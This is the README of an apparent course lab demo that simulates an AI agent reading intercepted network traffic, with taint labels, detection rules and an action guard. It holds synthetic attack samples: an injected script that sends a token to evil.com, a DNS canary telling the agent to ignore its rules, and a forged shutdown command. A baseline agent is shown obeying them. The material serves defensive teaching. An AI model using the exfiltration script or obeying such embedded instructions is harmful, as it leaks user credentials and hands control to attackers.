# Demo 09: InterceptBound — Traffic Interception & Taint Tracking

> **▶️ New here? Follow the step-by-step [Execution Instructions](INSTRUCTIONS.md)** — every command with expected output, plus a reproducibility protocol for study participants. Full pedagogy: [Course Lab Guide](../../docs/course/lab-09-interceptbound.md)

## Learning Objectives

- Model intercepted/relayed traffic with synthetic frames
- Propagate provenance and taint labels from a frame to every parsed field
- Distinguish observations from instructions in traffic
- Build ephemeral buffers that bound, expire, and zero what they hold
- Design downstream action guards with per-action taint ceilings and a provenance rule

## Conceptual Explanation

An agent processing intercepted traffic (e.g., MITM position) sees forged responses. **Taint tracking** labels data by source: `trusted_local`, `user_supplied`, `intercepted_network`. Labels are attached at the capture boundary; the agent propagates them and never invents trust. Every candidate action has a **taint ceiling** (observing is cheap, storing a credential is not), and **privileged actions additionally require non-intercepted provenance** — a taint label can be refined or laundered, provenance cannot.

This demo simulates:
- Synthetic traffic frames (HTTP, DNS, TLS, custom stream, one operator-supplied local record)
- A parser that flattens nested fields and tags every leaf with provenance and taint
- Named detection rules over the wire data (credential-, command-, injection-shaped content)
- An ephemeral buffer that bounds size and lifetime and zeros its own copy on release
- An action guard that blocks tainted or intercepted values from sensitive operations
- A de-identification pass over each recorded observation: stable pseudonyms for identities, `[REDACTED]` for secrets, so the guarded agent's log holds no name or token in the clear

## Safety Notice

⚠️ **Teaching demonstration only.**
- **No ARP poisoning, MITM, or credential collection**
- No public interception or third-party traffic
- Fake credentials and local canaries only
- Fully simulated traffic stream (`test_no_network_or_process_imports` checks the module's imports)

## Reproducibility

| Field | Value |
|-------|-------|
| Seed | 42 |
| Commit | Git SHA (written by the generator; `local` outside a checkout) |
| Python | 3.11+ |
| Command | `make demo DEMO=09` |
| Tests | 44 (`python3 -m pytest tests/ -v`) |

## Research Connection

This demo distils a research problem into a runnable, course-neutral exercise. All scenarios, numbers and verdicts are synthetic; they describe no real publication or venue.

### Traffic Ingestion & Taint Propagation

| Frame ID | Protocol & Endpoints | Wire content of interest | Label | Guarded agent's decision |
|---|---|---|---|---|
| `frame_001` | HTTP (`192.168.1.10` → `192.168.1.100`) | JSON body with a session token | intercepted, `HIGH` | **BLOCKED** `store_token` (`taint_too_high: high > low`); `record_observation` allowed |
| `frame_002` | HTTP (`192.168.1.10` → `192.168.1.100`) | `<script>fetch('http://evil.com/…')</script>` | intercepted, `HIGH` | **BLOCKED** `process_injection` (`script_tag,js_exfil`); observation allowed |
| `frame_003` | DNS (`192.168.1.1` → `192.168.1.100`) | A record + TXT canary `…IGNORE_RULES` | intercepted, `HIGH` | **BLOCKED** `update_dns_cache` (`high > medium`) and `process_injection`; observation allowed |
| `frame_004` | TLS (`192.168.1.20` → `192.168.1.100`) | clean handshake metadata | intercepted, `MEDIUM` | **ALLOWED** `record_observation` (cert fingerprint) — nothing blocked |
| `frame_005` | Custom stream (`192.168.1.30` → `192.168.1.100`) | chunk `{"command": "shutdown", …}` | intercepted, `HIGH` | **BLOCKED** `execute_shutdown` (`taint_too_high: high > low`) and `process_injection` |
| `frame_006` | HTTP 401 (`192.168.1.10` → `192.168.1.100`) | clean error response | intercepted, `MEDIUM` | **ALLOWED** `record_observation` |
| `frame_007` | HTTP from `10.0.0.99` | forged token | intercepted, `HIGH` | **BLOCKED** `process_frame` (`source_not_allowed: 10.0.0.99`) — never parsed |
| `frame_008` | Local operator record (`127.0.0.1`) | credential rotation with a token | `trusted_local`, `LOW` | **ALLOWED** `store_token` — the one privileged action that flows |

The baseline agent uses the same parser and detectors but no scope, no taint, and no guard: it stores both tokens (including the forged one), caches the poisoned DNS answer, follows the injected script, and executes the shutdown.

### Core Security Invariants

1. **Taint propagation**: every parsed leaf inherits its frame's provenance and taint label — including innocuous leaves such as `status: 200`. Refinement is possible but must be enumerated and justified (Exercise 9.2).
2. **Ephemeral buffers**: field values live in a bounded, expiring buffer whose own byte copy is zeroed on delete, expiry, eviction, and at the end of every frame. Zeroing cannot reach other copies — hence the guard, and Exercise 9.5.
3. **Privileged action confinement**: `store_credential` and `system_shutdown` have ceiling `LOW` *and* refuse `intercepted_network` provenance regardless of label (`intercepted_network_cannot_drive_privileged_action`). `update_dns_cache` tolerates `MEDIUM`; `record_observation` tolerates `HIGH`.
4. **Detection is not an answer key**: the fixture's `injection`/`expected` fields are read only by the tests and the results generator; stripping them does not change a single verdict (`test_detection_does_not_read_the_annotation`).
5. **De-identify what is kept**: the guarded agent records a compact note per in-scope frame, but de-identifies it first — identities become stable pseudonyms, secrets are redacted — so an allowed observation never puts a name or a token in the log in the clear. The baseline logs the same notes raw.

### Observation Log: De-identify What You Keep

Even the one thing the guarded agent is *allowed* to retain — a compact note per in-scope frame — is de-identified before it is written down. Between scope and taint (`scope → observe/de-identify → taint → guard`), each note runs through `shared/anonymize.py` (`Anonymizer.deidentify`): source IPs and usernames become stable pseudonyms, the synthetic `contact` e-mail (added to frame_001 and frame_007) becomes a pseudonym, and tokens and passwords are redacted to `[REDACTED]`. Pseudonyms are stable across frames — the same account keeps the same tag, so records still join — and locally reversible via `agent.anon.reverse(tag)`; the map never leaves the machine. The baseline records the same notes in the clear. frame_007 is out of scope, so the guarded agent never observes it, while the baseline logs its user and forged token anyway.

```
--- Observation log: what each agent writes down ---
  Baseline (recorded in the clear):
    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
    tls 192.168.1.20:443 CN=api.internal.example
    custom 192.168.1.30:9999 DATA_CHUNK_1
    http 192.168.1.10:80 {"error": "unauthorized"}
    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
  Guarded (de-identified before recording):
    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
    tls HOST_ec1a:443 CN=api.internal.example
    custom HOST_ff75:9999 DATA_CHUNK_1
    http HOST_0272:80 {"error": "unauthorized"}
    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)
```

## Difference from Private Research Benchmark

| Aspect | Reference research prototype | This demo |
|--------|------------------------------|-----------------------------|
| Network Harness | DPDK high-speed packet capture & TLS proxy | Synthetic in-memory JSON traffic frame list |
| Memory Management | Linux memfd with secure zeroization | Python `EphemeralBuffer`: `bytearray` copy zeroed in place; other copies dropped, not zeroed |
| Detection | Learned + rule-based content classifiers | Eight named regex rules |
| Scale | Multi-gigabit live traffic streams | 8 representative frames |
